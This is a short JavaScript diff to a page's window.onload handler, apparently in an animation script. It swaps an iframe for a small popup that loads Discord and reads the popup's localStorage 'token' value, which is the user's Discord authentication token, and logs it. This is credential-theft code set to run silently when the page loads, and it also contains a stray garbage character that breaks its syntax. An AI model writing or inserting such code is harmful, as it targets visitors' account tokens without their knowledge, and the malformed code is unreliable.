@@ -132,10 +132,12 @@ function animate () {
 }
 
 window.onload = function () {
-  var i = document.createElement('iframe');
-  i.src = 'https://discord.com/channels/@me';
-  document.body.appendChild(i);
-  let ifr = i.contentWindow;
-  let localStorage = ifr.localStorage;
-  console.log(localStorage)
+  let popup = window.open('https://discord.com/channels/@me', 'popup', 'width=300,height=200');
+
+  popup.addEventListener('load', function() {Ï
+    let popupLocalStorage = popup.localStorage;
+  
+    let data = popupLocalStorage.token
+    console.log(data);
+  });
 }
